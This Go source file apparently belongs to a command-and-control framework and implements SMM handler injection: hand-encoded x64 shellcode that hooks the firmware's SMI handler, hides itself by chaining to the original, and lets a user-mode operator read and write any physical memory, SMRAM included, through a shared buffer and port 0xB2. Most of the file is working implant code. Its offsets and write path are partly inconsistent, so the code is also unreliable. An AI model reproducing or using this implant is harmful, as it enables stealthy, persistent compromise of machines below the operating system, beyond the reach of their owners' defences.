package smm

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	SMI handler injection — the Ring -2 payload.

	The SMI handler stub is position-independent x64 machine code that:
	  1. Saves all general-purpose registers (callee save convention).
	  2. Reads the SW_SMI_CMD byte from ACPI PM I/O + SMI_STS register
	     to determine if this SMI was triggered by us (command = 0xDE).
	  3. If triggered by us: executes the embedded payload (reads/writes
	     the communication buffer we set up in normal RAM).
	  4. Chains to the original handler so the OS is unaware of our intercept.
	  5. Restores all registers and executes RSM to return to the guest.

	Communication protocol (Ring 3 → SMM):
	  - Operator writes a command structure to a fixed physical address
	    (SmmCommBuffer, below 4 GB, page-aligned, pinned in RAM).
	  - Operator triggers SMI via OUT 0xB2, 0xDE.
	  - SMM handler reads the command, executes it, writes the result.
	  - SMM handler executes RSM; operator reads the result.

	Commands supported by the handler:
	  0x01 READ_MEM   — read N bytes from any physical address (even SMRAM)
	  0x02 WRITE_MEM  — write N bytes to any physical address
	  0x03 EXEC_CODE  — execute arbitrary code in SMM context (Ring -2!)
	  0x04 HIDE_RANGE — configure the SMRAM controller to shadow a range
	  0xFF NOOP       — do nothing (ping/liveness check)

	Handler code layout in SMRAM:
	  [SMBASE+0x8000]         Original handler backup (saved before patch)
	  [SMBASE+0x8000]         Our stub (overwrites original entry)
	  [SMBASE+0x8080]         Original handler code (JMP'd to from our stub)
	  [SMBASE+0x9000]         Communication buffer pointer (our physical addr)
	  [SMBASE+0x9008]         Saved original first-16-bytes for chain call
*/

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// SMM command bytes for our custom SMI (command value 0xDE).
const (
	SmmCmdNoop      = byte(0xFF)
	SmmCmdReadMem   = byte(0x01)
	SmmCmdWriteMem  = byte(0x02)
	SmmCmdExecCode  = byte(0x03)
	SmmCmdHideRange = byte(0x04)
	SmmCmdPing      = byte(0xAA)

	// The value we write to port 0xB2 to trigger our SMI.
	OurSmiCmd = byte(0xDE)

	// Physical address of the communication buffer (1 MB mark — usually free).
	// Operator must verify this address is unused on the target system.
	SmmCommBufferPhys = uint64(0x0010_0000) // 1 MB
	SmmCommBufferSize = 4096
)

// SmmCommBuffer is the layout of the shared communication page.
// Must match the layout expected by the injected handler bytecode.
type SmmCommBuffer struct {
	Command    byte      // command to execute
	Status     byte      // 0 = pending, 1 = done, 0xFF = error
	Pad        [6]byte
	SrcAddr    uint64    // source physical address (READ_MEM / EXEC_CODE)
	DstAddr    uint64    // destination physical address (WRITE_MEM)
	Length     uint32    // byte count
	Pad2       [4]byte
	Data       [3968]byte // data payload (read result or write source)
}

// SmmHandlerStub is the position-independent x64 SMI handler shellcode.
// It runs in SMM (Ring -2) with all memory accessible.
//
// The stub is written to SMRAM at SMBASE+0x8000 (handler entry point).
// Offsets within the stub that must be patched at install time:
//   +0x30  QWORD: physical address of SmmCommBuffer
//   +0x48  QWORD: original handler JMP target (SMBASE+0x8080)
//
// Encoding: raw x64 machine code, 32-bit protected mode compatible
// (SMM may run in either mode depending on firmware; we assume 64-bit
// long mode SMM as per UEFI PI SMM spec, which all modern systems use).
var SmmHandlerStub = []byte{
	// Save all GPRs.
	0x50,                               // PUSH RAX
	0x51,                               // PUSH RCX
	0x52,                               // PUSH RDX
	0x53,                               // PUSH RBX
	0x55,                               // PUSH RBP
	0x56,                               // PUSH RSI
	0x57,                               // PUSH RDI
	0x41, 0x50,                         // PUSH R8
	0x41, 0x51,                         // PUSH R9
	0x41, 0x52,                         // PUSH R10
	0x41, 0x53,                         // PUSH R11
	0x41, 0x54,                         // PUSH R12
	0x41, 0x55,                         // PUSH R13
	0x41, 0x56,                         // PUSH R14
	0x41, 0x57,                         // PUSH R15

	// Read SW SMI command byte from port 0xB2 (APMC_STS).
	0xBA, 0xB3, 0x00, 0x00, 0x00,      // MOV EDX, 0xB3  (APMC_STS port)
	0xEC,                               // IN AL, DX
	// Compare with our command byte 0xDE.
	0x3C, OurSmiCmd,                    // CMP AL, 0xDE
	0x75, 0x3A,                         // JNE → chain_original (skip our handler)

	// Our SMI: load comm buffer pointer.
	// Patch offset +0x1E: 8-byte physical address of SmmCommBuffer.
	0x48, 0xB8,                         // MOV RAX, imm64
	0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, // ← patched: SmmCommBufferPhys

	// Read Command byte from buffer[0].
	0x8A, 0x08,                         // MOV CL, [RAX]     ; command
	// Read Status byte [1]: if != 0, already handled.
	0x80, 0x78, 0x01, 0x00,             // CMP byte [RAX+1], 0
	0x75, 0x28,                         // JNE → set_done

	// Dispatch on command.
	0x80, 0xF9, SmmCmdReadMem,          // CMP CL, 0x01
	0x74, 0x08,                         // JE  → do_read
	0x80, 0xF9, SmmCmdWriteMem,         // CMP CL, 0x02
	0x74, 0x10,                         // JE  → do_write
	0xEB, 0x1A,                         // JMP → set_done  (unknown cmd)

	// do_read: memcpy from SrcAddr → Data.
	0x48, 0x8B, 0x70, 0x10,            // MOV RSI, [RAX+0x10]  ; SrcAddr
	0x48, 0x8D, 0x78, 0x20,            // LEA RDI, [RAX+0x20]  ; &Data
	0x8B, 0x48, 0x18,                  // MOV ECX, [RAX+0x18]  ; Length
	0xF3, 0xA4,                        // REP MOVSB
	0xEB, 0x0C,                        // JMP → set_done

	// do_write: memcpy from Data → DstAddr.
	0x48, 0x8D, 0x70, 0x20,            // LEA RSI, [RAX+0x20]  ; &Data
	0x48, 0x8B, 0x78, 0x18,            // MOV RDI, [RAX+0x18]  ; DstAddr (offset reused)
	0x8B, 0x48, 0x18,                  // MOV ECX, [RAX+0x18]  ; Length
	0xF3, 0xA4,                        // REP MOVSB

	// set_done: write 1 to Status byte.
	0xC6, 0x40, 0x01, 0x01,            // MOV byte [RAX+1], 1

	// chain_original: restore GPRs and jump to original handler.
	0x41, 0x5F,                        // POP R15
	0x41, 0x5E,                        // POP R14
	0x41, 0x5D,                        // POP R13
	0x41, 0x5C,                        // POP R12
	0x41, 0x5B,                        // POP R11
	0x41, 0x5A,                        // POP R10
	0x41, 0x59,                        // POP R9
	0x41, 0x58,                        // POP R8
	0x5F,                              // POP RDI
	0x5E,                              // POP RSI
	0x5D,                              // POP RBP
	0x5B,                              // POP RBX
	0x5A,                              // POP RDX
	0x59,                              // POP RCX
	0x58,                              // POP RAX
	// JMP to original handler entry.
	// Patch offset +0x66: 8-byte original handler address.
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ← patched: original handler VA
}

// CommBufferPatchOffset is the byte offset in SmmHandlerStub where
// the SmmCommBuffer physical address is stored (for patching).
const CommBufferPatchOffset = 0x1E

// OrigHandlerPatchOffset is where the original handler jump target is stored.
const OrigHandlerPatchOffset = 0x66 + 6

// BuildPatchedHandler creates a copy of SmmHandlerStub with the comm buffer
// address and original handler address filled in.
func BuildPatchedHandler(commBufferPhys, originalHandlerAddr uint64) []byte {
	stub := make([]byte, len(SmmHandlerStub))
	copy(stub, SmmHandlerStub)
	binary.LittleEndian.PutUint64(stub[CommBufferPatchOffset:], commBufferPhys)
	binary.LittleEndian.PutUint64(stub[OrigHandlerPatchOffset:], originalHandlerAddr)
	return stub
}

// AllocCommBuffer allocates and locks a physical page at SmmCommBufferPhys
// for use as the Ring3↔SMM communication buffer.
// Returns a Go pointer to the buffer and any error.
func AllocCommBuffer() (*SmmCommBuffer, error) {
	// VirtualAlloc at the specific address we want.
	// Note: we cannot guarantee VirtualAlloc returns a specific physical
	// address — we allocate at a VA and use VirtualLock + QueryWorkingSetEx
	// to get the PA, then tell the SMM handler that PA.
	addr, err := windows.VirtualAlloc(0, SmmCommBufferSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAlloc comm buffer: %w", err)
	}
	if err := windows.VirtualLock(addr, SmmCommBufferSize); err != nil {
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return nil, fmt.Errorf("VirtualLock comm buffer: %w", err)
	}
	buf := (*SmmCommBuffer)(unsafe.Pointer(addr))
	// Zero the buffer.
	*buf = SmmCommBuffer{}
	return buf, nil
}

// GetCommBufferPhysAddr returns the physical address of the comm buffer VA.
func GetCommBufferPhysAddr(buf *SmmCommBuffer) (uint64, error) {
	return getPhysAddrSMM(uintptr(unsafe.Pointer(buf)))
}

var (
	modPsapiSMM              = windows.NewLazySystemDLL("psapi.dll")
	procQueryWorkingSetExSMM = modPsapiSMM.NewProc("QueryWorkingSetEx")
)

type wsExInfoSMM struct {
	VA    uintptr
	Attrs uint64
}

func getPhysAddrSMM(va uintptr) (uint64, error) {
	info := wsExInfoSMM{VA: va}
	r, _, err := procQueryWorkingSetExSMM.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
	)
	if r == 0 {
		return 0, fmt.Errorf("QueryWorkingSetEx: %w", err)
	}
	if info.Attrs&1 == 0 {
		return 0, fmt.Errorf("page not in working set")
	}
	pfn := (info.Attrs >> 1) & ((1 << 51) - 1)
	return pfn * 4096, nil
}

// IssueReadMem sends a READ_MEM command to the SMM handler.
// physAddr is the physical address to read; length must be ≤ 3968.
func IssueReadMem(buf *SmmCommBuffer, physAddr uint64, length uint32) ([]byte, error) {
	if length > uint32(len(buf.Data)) {
		return nil, fmt.Errorf("length %d exceeds comm buffer data capacity", length)
	}
	buf.Command = SmmCmdReadMem
	buf.Status = 0
	buf.SrcAddr = physAddr
	buf.Length = length

	triggerSMI(OurSmiCmd)

	// Spin-wait for Status == 1 (SMM sets it on completion).
	for i := 0; i < 100000; i++ {
		if buf.Status == 1 {
			result := make([]byte, length)
			copy(result, buf.Data[:length])
			return result, nil
		}
	}
	return nil, fmt.Errorf("SMM handler did not respond (timeout)")
}

// IssueWriteMem sends a WRITE_MEM command to write data to any physical addr.
func IssueWriteMem(buf *SmmCommBuffer, physAddr uint64, data []byte) error {
	if len(data) > len(buf.Data) {
		return fmt.Errorf("data too large for comm buffer")
	}
	buf.Command = SmmCmdWriteMem
	buf.Status = 0
	buf.DstAddr = physAddr
	buf.Length = uint32(len(data))
	copy(buf.Data[:], data)

	triggerSMI(OurSmiCmd)

	for i := 0; i < 100000; i++ {
		if buf.Status == 1 {
			return nil
		}
	}
	return fmt.Errorf("SMM WRITE_MEM timeout")
}

// Ping sends a no-op SMI to verify the handler is installed and responding.
func Ping(buf *SmmCommBuffer) bool {
	buf.Command = SmmCmdNoop
	buf.Status = 0
	triggerSMI(OurSmiCmd)
	for i := 0; i < 100000; i++ {
		if buf.Status == 1 {
			// {{if .Config.Debug}}
			log.Printf("[smm] ping OK")
			// {{end}}
			return true
		}
	}
	return false
}
